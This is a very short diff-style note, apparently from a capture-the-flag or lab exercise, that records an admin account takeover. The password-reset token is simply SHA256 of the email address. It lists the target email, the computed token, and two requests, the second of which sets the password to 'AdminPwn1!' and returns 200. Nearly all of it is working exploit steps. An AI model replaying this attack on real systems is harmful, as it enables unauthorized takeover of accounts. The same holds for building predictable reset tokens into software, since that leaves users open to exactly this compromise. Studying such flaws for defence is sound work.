@@ -1,0 +1,5 @@
+Q: forgetpassword + SHA256(email) resets admin? |+ /changepasswd/<token> 200 |- 404
+email=466774513041614c@master.guild
+token=sha256(email)=3ba672f8c27adbcd215c57c2b93f811762f8ba9c9549d293dc7814c31ab48e30
+POST /forgetpassword
+POST /changepasswd/<token> password=AdminPwn1! -> 200
